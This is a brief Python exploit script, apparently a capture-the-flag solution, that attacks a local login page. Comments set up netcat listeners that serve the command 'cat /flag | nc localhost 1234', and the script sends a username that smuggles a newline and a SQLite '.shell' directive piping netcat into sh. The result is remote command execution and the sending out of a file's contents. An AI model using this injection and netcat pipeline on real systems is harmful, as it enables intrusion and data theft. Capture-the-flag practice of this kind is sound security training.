# your server
# terminal1 : echo "cat /flag | nc localhost 1234" | nc -vvlp 1235
# terminal2 : nc localhost 1234 -kl                                 # get flag from here

# server: nc localhost 1234 | sh     # get "cat /flag | nc localhost 1234" command from port 1235 , then pipe to sh to execute

import requests
from os import system

url = "http://localhost:8888"
username = '";\n.shell nc localhost 1234 | sh\n'
data = {"username": username, "password": "hi"}
res = requests.post(f"{url}/login", data)
print(res.text)
